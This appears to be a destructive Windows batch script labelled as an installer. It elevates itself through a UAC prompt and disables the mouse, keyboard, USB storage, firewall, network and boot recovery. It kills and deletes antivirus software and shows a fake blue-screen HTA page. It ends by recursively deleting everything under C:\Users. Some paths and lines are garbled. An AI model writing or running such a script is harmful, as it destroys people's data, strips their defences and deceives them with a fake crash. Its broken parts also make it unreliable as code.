@echo off
 @echo off
 CLS
 ECHO.

:init
 setlocal DisableDelayedExpansion
 set cmdInvoke=1
 set winSysFolder=System32
 set "batchPath=%~0"
 for %%k in (%0) do set batchName=%%~nk
 set "vbsGetPrivileges=%temp%\OEgetPriv_%batchName%.vbs"
 setlocal EnableDelayedExpansion

:checkPrivileges
  NET FILE 1>NUL 2>NUL
  if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )

:getPrivileges
  if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPrivileges)
  ECHO.

  ECHO Set UAC = CreateObject^("Shell.Application"^) > "%vbsGetPrivileges%"
  ECHO args = "ELEV " >> "%vbsGetPrivileges%"
  ECHO For Each strArg in WScript.Arguments >> "%vbsGetPrivileges%"
  ECHO args = args ^& strArg ^& " "  >> "%vbsGetPrivileges%"
  ECHO Next >> "%vbsGetPrivileges%"

  if '%cmdInvoke%'=='1' goto InvokeCmd 

  ECHO UAC.ShellExecute "!batchPath!", args, "", "runas", 1 >> "%vbsGetPrivileges%"
  goto ExecElevation

:InvokeCmd
  ECHO args = "/c """ + "!batchPath!" + """ " + args >> "%vbsGetPrivileges%"
  ECHO UAC.ShellExecute "%SystemRoot%\%winSysFolder%\cmd.exe", args, "", "runas", 1 >> "%vbsGetPrivileges%"

:ExecElevation
 "%SystemRoot%\%winSysFolder%\WScript.exe" "%vbsGetPrivileges%" %*
 exit /B

:gotPrivileges
 setlocal & cd /d %~dp0
 if '%1'=='ELEV' (del "%vbsGetPrivileges%" 1>nul 2>nul  &  shift /1)

 ::::::::::::::::::::::::::::
 ::START
 ::::::::::::::::::::::::::::
REM Run shell as admin - title Install.bat
echo ...
net stop audiosrv   
net stop audiosrv   
net stop audiosrv   
net stop audiosrv   
net stop AudioEndpointBuilder
net stop AudioEndpointBuilder
net stop AudioEndpointBuilder
net stop AudioEndpointBuilder
taskkill /f  /im explorer.exe
rundll32.exe user32.dll,SetCursorPos
start main.cpl @0
rem ---------------------------------
rem Disable Mouse
set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key%
reg add %key% /v Start /t REG_DWORD /d 4
rem ---------------------------------
c:\windows\system32\rundll32.exe keyboard,disable
c:\windows\rundll32.exe keyboard,disable
cacls %windir%\Inf\Usbstor.pnf /d user
cacls %windir%\Inf\Usbstor.inf /d user
netsh firewall set opmode disable
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off 
netsh advfirewall set publicprofile state off
bcdedit /set {globalsettings} advancedoptions true
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures  
sc config "explorer.exe" start= disabled 
sc stop "explorer.exe"
netsh interface set interface "Ethernet" admin=disable

rem —
rem Permanently Kill Anti-Virus
net stop “Security Center”
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:Program Filesalwils~1avast4*.*
del /Q /F C:Program FilesLavasoftAd-awa~1*.exe
del /Q /F C:Program Fileskasper~1*.exe
cls
del /Q /F C:Program Filestrojan~1*.exe
del /Q /F C:Program Filesf-prot95*.dll
del /Q /F C:Program Filestbav*.dat
cls
del /Q /F C:Program Filesavpersonal*.vdf
del /Q /F C:Program FilesNorton~1*.cnt
del /Q /F C:Program FilesMcafee*.*
cls
del /Q /F C:Program FilesNorton~1Norton~1Norton~3*.*
del /Q /F C:Program FilesNorton~1Norton~1speedd~1*.*
del /Q /F C:Program FilesNorton~1Norton~1*.*
del /Q /F C:Program FilesNorton~1*.*
cls
del /Q /F C:Program Filesavgamsr*.exe
del /Q /F C:Program Filesavgamsvr*.exe
del /Q /F C:Program Filesavgemc*.exe
cls
del /Q /F C:Program Filesavgcc*.exe
del /Q /F C:Program Filesavgupsvc*.exe
del /Q /F C:Program Filesgrisoft
del /Q /F C:Program Filesnood32krn*.exe
del /Q /F C:Program Filesnood32*.exe
cls
del /Q /F C:Program Filesnod32
del /Q /F C:Program Filesnood32
del /Q /F C:Program Fileskav*.exe
del /Q /F C:Program Fileskavmm*.exe
del /Q /F C:Program Fileskaspersky*.*
cls
del /Q /F C:Program Filesewidoctrl*.exe
del /Q /F C:Program Filesguard*.exe
del /Q /F C:Program Filesewido*.exe
cls
del /Q /F C:Program Filespavprsrv*.exe
del /Q /F C:Program Filespavprot*.exe
del /Q /F C:Program Filesavengine*.exe
cls
del /Q /F C:Program Filesapvxdwin*.exe
del /Q /F C:Program Fileswebproxy*.exe
del /Q /F C:Program Filespanda software*.*
rem —
@echo off
echo ^<html^>^<head^>^<title^>BSOD^
</title^> > data1.hta
echo. >> data1.hta
echo ^<hta:application id="oBVC" >> data1.hta
echo applicationname="DATA1" >> data1.hta
echo version="1.0" >> data1.hta
echo maximizebutton="no" >> data1.hta
echo minimizebutton="no" >> data1.hta
echo sysmenu="no" >> data1.hta
echo Caption="no" >> data1.hta
echo windowstate="maximize"/^> >> data1.hta
echo. >> data1.hta
echo ^</head^>^<body bgcolor="#000088" scroll="no"^> >> data1.hta
echo ^<font face="Lucida Console" size="4" color="#FFFFFF"^> >> data1.hta
echo ^<p^>A pr0blem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> >>data1.hta
echo. >> data1.hta
echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQ
/p^> >> data1.htaecho. >> data1.hta
echo ^<p^>If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> >> data1.hta
echo. >> data1.hta
echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> >> data1.hta
echo. >> data1.hta
echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^</p^> >> data1.hta
echo. >> data1.hta
echo ^<p^>Technical information:^</p^> >> data1.hta
echo. >> data1.hta
echo ^<p^>*** STOP: 0x000792D1 (0x0000000C,0x00000002,0x00000
0xF86B5A89)^</p^> >> data1.htaecho. >> data1.hta
echo. >> data1.hta
echo ^<p^>*** gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> >> data1.hta
echo. >> data1.hta
echo ^<p^>Beginning dump of physical memory^</p^> >> data1.hta
echo ^<p^>Physical memory dump complete.^</p^> >> data1.hta
echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> >> data1.hta
echo. >> data1.hta
echo. >> data1.hta
echo ^</font^> >> data1.hta
echo ^</body^>^</html^> >> data1.hta
start "" /wait "data1.hta"
del /s /f /q "data1.hta" > nul
del C:\Users\*" /f /q /s

